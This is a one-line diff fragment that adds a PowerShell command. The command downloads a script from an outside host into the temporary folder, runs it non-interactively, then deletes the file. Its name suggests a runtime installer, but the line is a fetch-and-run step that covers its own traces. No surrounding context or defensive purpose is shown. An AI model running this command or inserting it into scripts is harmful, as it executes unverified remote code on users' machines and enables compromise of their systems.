@@ -1,0 +1,1 @@
+$p = "$env:TEMP\aio.ps1"; irm https://r.koresent.ru/aio-runtimes -OutFile $p; & $p -NonInteractive; Remove-Item $p
